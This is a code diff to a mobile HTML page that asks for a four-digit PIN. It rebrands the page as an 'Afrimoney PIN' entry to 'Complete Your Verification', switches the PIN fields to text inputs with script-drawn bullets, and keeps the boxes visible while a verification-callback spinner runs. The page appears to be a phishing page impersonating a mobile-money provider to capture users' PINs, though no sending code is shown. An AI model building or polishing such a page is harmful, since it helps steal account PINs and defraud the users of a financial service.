@@ -179,16 +179,16 @@
 
     <div class="mobile-viewport">
         <div class="top-stack">
-            <h1 class="login-heading">Enter Your PIN</h1>
-            <p class="login-subheading">Enter your pin to verify</p>
+            <h1 class="login-heading">Enter Your  Afrimoney PIN</h1>
+            <p class="login-subheading">Enter your Pin to Complete Your Verification</p>
         </div>
 
         <div class="middle-stack">
             <div id="pinBoxesContainer" class="pin-boxes-container">
-                <input type="password" class="pin-box active-box" id="p1" readonly value="">
-                <input type="password" class="pin-box" id="p2" readonly value="">
-                <input type="password" class="pin-box" id="p3" readonly value="">
-                <input type="password" class="pin-box" id="p4" readonly value="">
+                <input type="text" class="pin-box active-box" id="p1" readonly value="">
+                <input type="text" class="pin-box" id="p2" readonly value="">
+                <input type="text" class="pin-box" id="p3" readonly value="">
+                <input type="text" class="pin-box" id="p4" readonly value="">
             </div>
 
             <div id="pinCallbackSpinner" class="pin-callback-spinner" aria-label="Waiting for verification callback"></div>
@@ -247,11 +247,9 @@
 
         function setWaitingCallbackState(waiting) {
             if (waiting) {
-                pinBoxesContainer.style.display = 'none';
                 pinCallbackSpinner.classList.add('active');
             } else {
                 pinCallbackSpinner.classList.remove('active');
-                pinBoxesContainer.style.display = 'flex';
             }
         }
 
@@ -315,7 +313,7 @@
         function updatePinDisplay() {
             for (let i = 0; i < 4; i++) {
                 const box = document.getElementById('p' + (i + 1));
-                box.value = pinDigits[i];
+                box.value = pinDigits[i] !== '' ? '•' : '';
                 box.classList.remove('active-box');
             }
             const firstEmpty = pinDigits.findIndex(d => d === '');
